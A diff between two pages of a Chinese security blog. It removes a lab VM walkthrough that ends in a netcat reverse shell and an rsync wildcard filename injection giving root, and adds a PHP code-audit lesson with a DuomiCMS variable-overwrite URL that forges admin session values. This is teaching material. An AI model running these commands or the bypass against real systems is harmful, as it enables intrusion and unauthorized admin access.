@@ -14,15 +14,15 @@
   <meta name="theme-color">
 
   
-  <title>Maze-GuoQing靶机！ &middot; IIIIIII的博客</title>
-    <meta name="title" content="Maze-GuoQing靶机！ &middot; IIIIIII的博客">
+  <title>PHP代码审计7-变量覆盖 &middot; IIIIIII的博客</title>
+    <meta name="title" content="PHP代码审计7-变量覆盖 &middot; IIIIIII的博客">
 
   
   
-  <meta name="keywords" content="strings,">
+  <meta name="keywords" content="php,">
   
   
-  <link rel="canonical" href="https://Starrui777.github.io/posts/guoqing/">
+  <link rel="canonical" href="https://Starrui777.github.io/posts/code9phpmvc/">
   
   
   
@@ -95,45 +95,45 @@
   
 
   
-  <meta property="og:url" content="https://Starrui777.github.io/posts/guoqing/">
+  <meta property="og:url" content="https://Starrui777.github.io/posts/code9phpmvc/">
   <meta property="og:site_name" content="IIIIIII的博客">
-  <meta property="og:title" content="Maze-GuoQing靶机！">
+  <meta property="og:title" content="PHP代码审计7-变量覆盖">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-10-07T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-10-07T00:00:00+00:00">
-    <meta property="article:tag" content="Strings">
+    <meta property="article:published_time" content="2025-10-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-10-10T00:00:00+00:00">
+    <meta property="article:tag" content="Php">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Maze-GuoQing靶机！">
+  <meta name="twitter:title" content="PHP代码审计7-变量覆盖">
 
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Maze-GuoQing靶机！",
-    "headline": "Maze-GuoQing靶机！",
+    "name": "PHP代码审计7-变量覆盖",
+    "headline": "PHP代码审计7-变量覆盖",
     
     
     "inLanguage": "en",
-    "url" : "https:\/\/Starrui777.github.io\/posts\/guoqing\/",
+    "url" : "https:\/\/Starrui777.github.io\/posts\/code9phpmvc\/",
     "author" : {
       "@type": "Person",
       "name": "IIIIIIIIIIII"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-10-07T00:00:00\u002b00:00",
-    "datePublished": "2025-10-07T00:00:00\u002b00:00",
+    "dateCreated": "2025-10-10T00:00:00\u002b00:00",
+    "datePublished": "2025-10-10T00:00:00\u002b00:00",
     
-    "dateModified": "2025-10-07T00:00:00\u002b00:00",
+    "dateModified": "2025-10-10T00:00:00\u002b00:00",
     
-    "keywords": ["strings"],
+    "keywords": ["php"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "129"
+    "wordCount": "190"
   }]
   </script>
 
@@ -509,7 +509,7 @@
     <header id="single_header" class="mt-5 max-w-prose">
       
       <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-        Maze-GuoQing靶机！
+        PHP代码审计7-变量覆盖
       </h1>
       <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
         
@@ -562,7 +562,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-10-07T00:00:00&#43;00:00">7 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>129 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
+      <time datetime="2025-10-10T00:00:00&#43;00:00">10 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>190 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
     
 
     
@@ -586,11 +586,11 @@
         
           
             
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/strings/"
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/php/"
                 ><span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Strings
+    Php
   </span>
 </span>
 </a
@@ -740,7 +740,11 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#maze-guoqing靶机-作者群主-qq群660930334">Maze-GuoQing靶机-作者：群主-QQ群660930334</a></li>
+    <li><a href="#php代码审计7-变量覆盖">PHP代码审计7-变量覆盖</a>
+      <ul>
+        <li><a href="#案例一duomicms--变量覆盖">案例一：DuomiCMS  变量覆盖</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -754,7 +758,11 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#maze-guoqing靶机-作者群主-qq群660930334">Maze-GuoQing靶机-作者：群主-QQ群660930334</a></li>
+    <li><a href="#php代码审计7-变量覆盖">PHP代码审计7-变量覆盖</a>
+      <ul>
+        <li><a href="#案例一duomicms--变量覆盖">案例一：DuomiCMS  变量覆盖</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -774,55 +782,120 @@
 
         <div class="article-content max-w-prose mb-20">
           
-<h2 class="relative group">Maze-GuoQing靶机-作者：群主-QQ群660930334 
-    <div id="maze-guoqing靶机-作者群主-qq群660930334" class="anchor"></div>
+<h2 class="relative group">PHP代码审计7-变量覆盖 
+    <div id="php代码审计7-变量覆盖" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#maze-guoqing%e9%9d%b6%e6%9c%ba-%e4%bd%9c%e8%80%85%e7%be%a4%e4%b8%bb-qq%e7%be%a4660930334" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#php%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a17-%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 <!-- more --> 
-<pre tabindex="0"><code>└─# nmap 192.168.1.238       
-Starting Nmap 7.92 ( https://nmap.org ) at 2025-10-07 01:22 EDT
-Nmap scan report for 192.168.1.238
-Host is up (0.00074s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-MAC Address: 08:00:27:FE:EB:F8 (Oracle VirtualBox virtual NIC)
-</code></pre><p>访问80没什么东西有一个登录界面通过爆破发现爆破不出来</p>
-<p>下载中间这个选择的卷福图片使用strings发现后面有字符密码</p>
-<pre tabindex="0"><code>─# strings todd.png   
+<pre tabindex="0"><code>变量覆盖
+尽量找配置文件的，因为大量文件都会包含配置文件
+extract :
+parse_str()
+import_request_variables()
+$$  ： 比如 $a=&#39;b&#39; $b=123 echo $$a=123  相当于赋值a=b变量
+关键代码如下不用声明变量很方便但是有安全危险 通过$$_request 造成了 $_GET $_POST 然后通过键值对来对变量赋值
+foreach (array(&#39;_COOKIE&#39;,&#39;_POST&#39;,&#39;_GET&#39;) as $_REQUEST) {
+		    //$_REQUEST $$__REQUEST=$_COOKIE $_POST $_GET
+		    foreach ($$_REQUEST as $_key =&gt; $_value) {
+		        //echo $_key.&#39;&lt;br /&gt;&#39;;
+		        $$_key=$_value;   //比如?a=2 就是  $_key=a  $$_key=$a 意思就是给变量赋值
+		}
+}
+echo $b;
+echo $a;
+</code></pre>
+<h3 class="relative group">案例一：DuomiCMS  变量覆盖 
+    <div id="案例一duomicms--变量覆盖" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b%e4%b8%80duomicms--%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>duomiphp/common.php 下面有代码</p>
+<p>但是仅仅就是赋值 但是我们可以用来写入内容 比如session</p>
+<p>利用session要找到session 代码session_start</p>
+<p>就是说要包含这里代码</p>
+<pre tabindex="0"><code>session_start();
+require_once(&#34;../duomiphp/common.php&#34;);
+</code></pre><pre tabindex="0"><code>foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)
+{
+    foreach($$_request as $_k =&gt; $_v) ${$_k} = _RunMagicQuotes($_v);
+}
+</code></pre><p>看看他的验证代码</p>
+<p>duomiphp/check.admin.php</p>
+<p>就是说保持会话的话呢</p>
+<p>$_SESSION[&lsquo;duomi_admin_id&rsquo;]</p>
+<p>$_SESSION[&lsquo;duomi_group_id&rsquo;]</p>
+<p>$_SESSION[&lsquo;duomi_admin_name&rsquo;]</p>
+<p>若这三个 Session 变量存在且有效（非空），则认为用户已登录，并通过这些值获取用户身份和权限；</p>
+<p>就是说正常下：</p>
+<p>验证账号密码通过后，将数据库中查询到的 <code>userID</code>（用户 ID）、<code>groupid</code>（权限组 ID）、<code>userName</code>（用户名）存入 Session，后续请求通过读取这些值识别用户</p>
+<pre tabindex="0"><code>	var $keepUserIDTag = &#34;duomi_admin_id&#34;;
+	var $keepgroupidTag = &#34;duomi_group_id&#34;;
+	var $keepUserNameTag = &#34;duomi_admin_name&#34;;
+	
+	function keepUser()
+	{
+		if($this-&gt;userID!=&#34;&#34;&amp;&amp;$this-&gt;groupid!=&#34;&#34;)
+		{
+			global $admincachefile;
 
-todd:toddishandsome
-</code></pre><p>发现密码 hyh hyhforever登录后</p>
-<p>有一个password程序反编译获得密钥</p>
-<p>vhjidxowqr1</p>
-<p>凯撒解密偏移量3</p>
-<p>解得密码segfaultno1</p>
-<p>登录后查看进程pspy64</p>
-<pre tabindex="0"><code>/bin/sh -c cd /home/segfault &amp;&amp; rsync -t *.txt Guoqing:/tmp/backup/
-</code></pre><p>创建恶意脚本执行</p>
-<pre tabindex="0"><code>segfault@Guoqing:~$ vi 1.txt
-segfault@Guoqing:~$ cat 1.txt 
-#!/bin/bash
-busybox nc 192.168.1.199 6666 -e /bin/bash
-segfault@Guoqing:~$ 
-segfault@Guoqing:~$ chmod +x 1.txt 
-segfault@Guoqing:~$ echo &#34;&#34; &gt; &#39;-e sh 1.txt&#39;
-segfault@Guoqing:~$ ls -al
-然后监听
-└─# nc -lvvp 6666               
-listening on [any] 6666 ...
-192.168.1.238: inverse host lookup failed: Unknown host
-connect to [192.168.1.199] from (UNKNOWN) [192.168.1.238] 60544
-whoami
-root
-cat /root/root.txt
-flag{root-834xxx}
+			$_SESSION[$this-&gt;keepUserIDTag] = $this-&gt;userID;
+			$_SESSION[$this-&gt;keepgroupidTag] = $this-&gt;groupid;
+			$_SESSION[$this-&gt;keepUserNameTag] = $this-&gt;userName;
+
+			$fp = fopen($admincachefile,&#39;w&#39;);
+			fwrite($fp,&#39;&lt;&#39;.&#39;?php $admin_path =&#39;.&#34; &#39;{$this-&gt;adminDir}&#39;; ?&#34;.&#39;&gt;&#39;);
+			fclose($fp);
+			return 1;
+		}
+		else
+		{
+			return -1;
+		}
+	}
+	
+</code></pre><p>_SESSION[duomi_admin_id]=1&amp;SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_name]=admin</p>
+<p>_SESSION[duomi_admin_id]=0&amp;SESSION[duomi_group_id]=0&amp;_SESSION[duomi_admin_name]=0</p>
+<p>访问有两行代码的文件</p>
+<p>http://localhost:919/member/reg.php?_SESSION[duomi_admin_id]=1&amp;SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_name]=admin</p>
+<p>这时候session已经产生了</p>
+<p>再访问admin就可以直接进入</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/ex/1.png">
+
+  
+</figure>
+</p>
+<p>看看session文件</p>
+<pre tabindex="0"><code>duomi_admin_id|s:1:&#34;1&#34;;
+duomi_admin_name|s:5:&#34;admin&#34;;
+duomi_ckstr|s:4:&#34;vadh&#34;;
+duomi_ckstr_last|s:0:&#34;&#34;;
+</code></pre><p>产生session的原因</p>
+<pre tabindex="0"><code>1：请求到达服务器，session_start() 执行
+	如果你是首次访问（没有 PHPSESSID）：PHP 会生成一个新的 Session ID（如 sess_xxx），并在服务器的 Session 目录（通常是 /tmp 或配置的 session.save_path）创建对应的空文件（如 sess_xxx）。
+如果你已有 Session ID（浏览器保存了 PHPSESSID）：PHP 会直接打开对应的 Session 文件（如 sess_xxx），准备读取 / 修改其中的数据。
+2：	变量覆盖漏洞将注入参数写入 $_SESSION 写入对应的数值到session中
+</code></pre><p>原理就是自己可以写入数据到session中去了， <code>相当于 “跳过了服务器的正常验证流程，强行将本应由服务器写入的数据，用自己的输入覆盖进去”。</code></p>
+<p><strong>判断 “是否已登录” 的隐含逻辑</strong> 非空就可以</p>
+<p>_SESSION[duomi_admin_id]=&amp;SESSION[duomi_group_id]=&amp;_SESSION[duomi_admin_name]=当是这个时候就不行了你改为0都可以</p>
+<pre tabindex="0"><code>duomi_admin_id|s:1:&#34;0&#34;;duomi_admin_name|s:1:&#34;0&#34;;duomi_ckstr|s:4:&#34;cinm&#34;;duomi_ckstr_last|s:0:&#34;&#34;;
+反正有值就可以进去
 </code></pre>
           
           
@@ -838,6 +911,129 @@ flag{root-834xxx}
   
     <h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
     <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+      
+        
+<div
+  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
+  <a
+    
+  href="/posts/code8phpmvc/"
+    class="absolute inset-0"
+    aria-label="MVC-PHP代码审计6-框架-文件包含"></a>
+      
+    
+        
+          <div
+            class="thumbnail_card_related nozoom w-full"
+            style="background-image:url(/image/background.svg);"></div>
+        
+      
+  <div class="px-6 py-4">
+    
+      <div
+        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
+        MVC-PHP代码审计6-框架-文件包含
+      </div>
+    
+    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-10-09T00:00:00&#43;00:00">9 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>151 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/php/"
+                ><span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Php
+  </span>
+</span>
+</a
+              >
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+    </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</div>
+
       
         
 <div
@@ -939,129 +1135,6 @@ flag{root-834xxx}
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
     Php
-  </span>
-</span>
-</a
-              >
-            
-          
-        
-      
-    </div>
-  
-
-  
-  
-
-
-
-    </div>
-    
-  </div>
-  <div class="px-6 pt-4 pb-2"></div>
-</div>
-
-      
-        
-<div
-  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
-  <a
-    
-  href="/posts/ame/"
-    class="absolute inset-0"
-    aria-label="Logi靶机-maze-JWT-Ti15中国队加油！"></a>
-      
-    
-        
-          <div
-            class="thumbnail_card_related nozoom w-full"
-            style="background-image:url(/image/background.svg);"></div>
-        
-      
-  <div class="px-6 py-4">
-    
-      <div
-        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
-        Logi靶机-maze-JWT-Ti15中国队加油！
-      </div>
-    
-    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
-      
-
-
-
-
-
-
-
-  
-
-  
-  
-  
-
-  
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <time datetime="2025-10-01T00:00:00&#43;00:00">1 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>265 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
-    
-
-    
-    
-  </div>
-
-  
-
-  
-  
-    <div class="flex flex-row flex-wrap items-center">
-      
-        
-      
-        
-          
-        
-      
-        
-      
-        
-          
-            
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/jwt/"
-                ><span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Jwt
   </span>
 </span>
 </a
@@ -1213,139 +1286,6 @@ flag{root-834xxx}
   class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
   <a
     
-  href="/posts/readfile/"
-    class="absolute inset-0"
-    aria-label="readfile靶机-maze-snmp-rbash-能力机制"></a>
-      
-    
-        
-          <div
-            class="thumbnail_card_related nozoom w-full"
-            style="background-image:url(/image/background.svg);"></div>
-        
-      
-  <div class="px-6 py-4">
-    
-      <div
-        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
-        readfile靶机-maze-snmp-rbash-能力机制
-      </div>
-    
-    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
-      
-
-
-
-
-
-
-
-  
-
-  
-  
-  
-
-  
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <time datetime="2025-09-28T00:00:00&#43;00:00">28 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>723 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
-    
-
-    
-    
-  </div>
-
-  
-
-  
-  
-    <div class="flex flex-row flex-wrap items-center">
-      
-        
-      
-        
-          
-        
-      
-        
-      
-        
-          
-            
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/rbash/"
-                ><span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Rbash
-  </span>
-</span>
-</a
-              >
-            
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/smtp/"
-                ><span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Smtp
-  </span>
-</span>
-</a
-              >
-            
-          
-        
-      
-    </div>
-  
-
-  
-  
-
-
-
-    </div>
-    
-  </div>
-  <div class="px-6 pt-4 pb-2"></div>
-</div>
-
-      
-        
-<div
-  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
-  <a
-    
   href="/posts/code4phpmvc/"
     class="absolute inset-0"
     aria-label="MVC-PHP代码审计2"></a>
@@ -1464,6 +1404,129 @@ flag{root-834xxx}
 </div>
 
       
+        
+<div
+  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
+  <a
+    
+  href="/posts/code5phpmvc/"
+    class="absolute inset-0"
+    aria-label="MVC-PHP代码审计3-反序列化-原生-框架"></a>
+      
+    
+        
+          <div
+            class="thumbnail_card_related nozoom w-full"
+            style="background-image:url(/image/background.svg);"></div>
+        
+      
+  <div class="px-6 py-4">
+    
+      <div
+        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
+        MVC-PHP代码审计3-反序列化-原生-框架
+      </div>
+    
+    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-09-27T00:00:00&#43;00:00">27 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>452 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+          
+            
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/php/"
+                ><span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Php
+  </span>
+</span>
+</a
+              >
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+    </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</div>
+
+      
     </section>
   
 
@@ -1483,8 +1546,8 @@ flag{root-834xxx}
           type="text/javascript"
           src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
           integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
-          data-oid="views_posts\guoqing.md"
-          data-oid-likes="likes_posts\guoqing.md"></script>
+          data-oid="views_posts\code9phpmvc.md"
+          data-oid-likes="likes_posts\code9phpmvc.md"></script>
       
     </section>
 
@@ -1500,7 +1563,7 @@ flag{root-834xxx}
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/code7phpmvc/">
+            <a class="flex group mr-3" href="/posts/code8phpmvc/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1511,11 +1574,11 @@ flag{root-834xxx}
               >
               <span class="flex flex-col">
                 <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >MVC-PHP代码审计5-框架-反序列化构建链</span
+                  >MVC-PHP代码审计6-框架-文件包含</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-10-06T00:00:00&#43;00:00">6 October 2025</time>
+                    <time datetime="2025-10-09T00:00:00&#43;00:00">9 October 2025</time>
                   
                 </span>
               </span>
@@ -1524,14 +1587,14 @@ flag{root-834xxx}
         </span>
         <span>
           
-            <a class="flex text-right group ml-3" href="/posts/code8phpmvc/">
+            <a class="flex text-right group ml-3" href="/posts/code10phpmvc/">
               <span class="flex flex-col">
                 <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >MVC-PHP代码审计6-框架-文件包含</span
+                  >PHP代码审计8-XXE-XSS</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-10-09T00:00:00&#43;00:00">9 October 2025</time>
+                    <time datetime="2025-10-15T00:00:00&#43;00:00">15 October 2025</time>
                   
                 </span>
               </span>
